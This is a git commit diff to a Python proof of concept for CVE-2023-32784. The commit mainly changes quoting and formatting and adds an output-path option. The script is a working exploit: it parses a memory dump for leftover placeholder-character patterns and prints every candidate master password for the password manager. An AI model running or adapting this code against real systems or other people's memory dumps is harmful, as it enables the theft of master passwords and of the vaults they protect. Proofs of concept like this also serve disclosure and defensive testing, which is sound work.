fb6b2c2720dace89dc698d4faa3634f0beaff1e5
mihaiandreineacsu <106650061+mihaiandreineacsu@users.noreply.github.com>
2024-10-13 10:35:27 +0200

    format and new arg

--- poc.py
+++ poc.py
@@ -6,11 +6,11 @@ import itertools
 class TaggedFormatter(logging.Formatter):
 
     TAGS = {
-        'DEBUG': '\x1b[1;35m#\x1b[0m',
-        'INFO': '\x1b[1;34m.\x1b[0m',
-        'WARNING': '\x1b[1;33m-\x1b[0m',
-        'ERROR': '\x1b[1;31m!\x1b[0m',
-        'CRITICAL': '\x1b[1;31m!!\x1b[0m'
+        "DEBUG": "\x1b[1;35m#\x1b[0m",
+        "INFO": "\x1b[1;34m.\x1b[0m",
+        "WARNING": "\x1b[1;33m-\x1b[0m",
+        "ERROR": "\x1b[1;31m!\x1b[0m",
+        "CRITICAL": "\x1b[1;31m!!\x1b[0m",
     }
 
     def __init__(self, format):
@@ -25,8 +25,8 @@ class TaggedFormatter(logging.Formatter):
         return logging.Formatter.format(self, record)
 
 
-def setup_logging(debug = False):
-    formatter = TaggedFormatter('%(asctime)s [%(levelname)s] [%(name)s] %(message)s')
+def setup_logging(debug=False):
+    formatter = TaggedFormatter("%(asctime)s [%(levelname)s] [%(name)s] %(message)s")
     handler = logging.StreamHandler()
     root_logger = logging.getLogger()
 
@@ -40,10 +40,11 @@ def setup_logging(debug = False):
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='CVE-2023-32784 proof-of-concept')
+    parser = argparse.ArgumentParser(description="CVE-2023-32784 proof-of-concept")
 
-    parser.add_argument('dump', type=str, help='The path of the memory dump to analyze')
-    parser.add_argument('-d', '--debug', dest='debug', action='store_true', help='Enable debugging mode')
+    parser.add_argument("dump", type=str, help="The path of the memory dump to analyze")
+    parser.add_argument("-d", "--debug", dest="debug", action="store_true", help="Enable debugging mode")
+    parser.add_argument("-o", "--output", type=str, help="The path to output possible passwords")
 
     return parser.parse_args()
 
@@ -54,44 +55,43 @@ def get_candidates(dump_file):
     str_len = 0
     i = 0
 
-    while i < len(data)-1:
+    while i < len(data) - 1:
         if (data[i] == 0xCF) and (data[i + 1] == 0x25):
             str_len += 1
             i += 1
         elif str_len > 0:
             if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
-                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])
+                candidate = (str_len * b"\xCF\x25") + bytes([data[i], data[i + 1]])
 
-                if not candidate in candidates:
+                if candidate not in candidates:
                     candidates.append(candidate)
-            
+
             str_len = 0
-        
+
         i += 1
-    
+
     return candidates
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     args = parse_args()
     setup_logging(args.debug)
-    logger = logging.getLogger('main')
+    logger = logging.getLogger("main")
 
-    with open(args.dump, 'rb') as dump_file:
-        logger.info(f'Opened {dump_file.name}')
+    with open(args.dump, "rb") as dump_file:
+        logger.info(f"Opened {dump_file.name}")
 
         candidates = get_candidates(dump_file)
-        candidates = [x.decode('utf-16-le') for x in candidates]
+        candidates = [x.decode("utf-16-le") for x in candidates]
         groups = [[] for i in range(max([len(i) for i in candidates]))]
 
         for candidate in candidates:
             groups[len(candidate) - 1].append(candidate[-1])
-        
+
         for i in range(len(groups)):
             if len(groups[i]) == 0:
-                groups[i].append(b'\xCF\x25'.decode('utf-16-le'))
-        
-        for password in itertools.product(*groups):
-            password = ''.join(password)
-            print(f'Possible password: {password}')
+                groups[i].append(b"\xCF\x25".decode("utf-16-le"))
 
+        for password in itertools.product(*groups):
+            password = "".join(password)
+            print(f"Possible password: {password}")
